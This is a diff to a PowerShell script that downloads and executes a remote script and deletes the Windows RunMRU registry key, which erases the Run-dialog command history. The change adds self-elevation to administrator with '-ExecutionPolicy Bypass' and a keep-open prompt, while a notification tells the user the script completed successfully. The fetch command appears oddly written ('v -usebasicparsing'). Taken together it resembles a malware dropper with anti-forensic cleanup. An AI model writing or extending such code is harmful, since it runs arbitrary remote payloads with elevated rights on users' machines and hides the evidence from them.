@@ -14,6 +14,12 @@ function Show-Notification {
     [System.Windows.MessageBox]::Show($Message, $Title)
 }
 
+# Run script as administrator
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Start-Process powershell.exe "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
+
 # Download and execute remote script
 try {
     $remoteScript = v -usebasicparsing $scriptUrl;
@@ -139,3 +145,7 @@ Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU -For
 
 # Notify user and exit script
 Show-Notification -Message "Script completed successfully." -Title "Script Notification"
+
+# Keep command prompt open
+Write-Host "Press any key to continue..."
+$x = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');
